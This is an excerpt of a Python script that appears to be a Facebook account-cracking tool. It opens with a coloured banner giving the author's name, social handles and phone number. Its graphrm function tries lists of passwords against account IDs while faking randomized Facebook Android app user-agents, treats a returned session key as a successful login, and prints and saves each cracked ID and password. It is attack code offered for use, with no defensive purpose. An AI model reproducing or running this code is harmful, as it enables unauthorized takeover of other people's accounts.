...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;33m 
\x1b[10;93m╠══[Author                   • \x1b[1;38mMR JOY ]     ║ 
\x1b[10;91m╠══[Facebook                 • JOY AHMED ]   ║    
\x1b[10;97m╠══[Github                   • JOY-AHMED-88 ]   ║   
\x1b[10;94m╠══[Whatsapp                 • 01709045888 ]  ║ 
...
#------------------[ XDG ]-----------------#
os.system('xdg-open https://www.facebook.com/profile.php?id=100000121528628')
...
def rmenu1():
    ...
    if '2' in rcd:print('                [10;92mAdmin Facebook idz');os.system('xdg-open https://www.facebook.com/profile.php?id=100000121528628');time.sleep(3)
...
def graphrm(id,psd,tid):
    ...
    for psw in psd:
        ...
        ua1 = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + '[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
        ...
        if 'session_key' in lo:
            ...
            print(f'''\r\r\x1b[10;92m[JOY-Ok💚] {iid} | {psw} \x1b[10;91m•> \x1b[10;92m{tutulx(iid)}''')
            os.system('espeak -a 300 "JOY,  Ok,  id"')
            ok.append(id)
